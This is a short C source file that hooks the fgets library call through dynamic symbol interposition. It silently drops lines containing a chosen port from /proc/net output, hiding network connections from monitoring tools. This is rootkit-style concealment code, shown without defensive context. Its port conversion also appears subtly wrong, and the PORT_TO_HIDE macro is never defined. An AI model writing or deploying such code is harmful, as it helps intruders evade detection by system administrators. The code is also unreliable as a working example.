#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <arpa/inet.h>

char *fgets(char *s, int size, FILE *stream) {
    static char* (*orig)(char*, int, FILE*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");

    char *ret = orig(s, size, stream);
    if (ret) {
        char target[16];
        
        // Works for any port: automatically handles the Big-Endian hex conversion required by /proc/net/
        unsigned short net_port = htons(PORT_TO_HIDE);
        snprintf(target, sizeof(target), ":%04X", net_port);

        if (strstr(s, target)) {
            // Safely skip the line using the original system function
            return orig(s, size, stream);
        }
    }
    return ret;
}
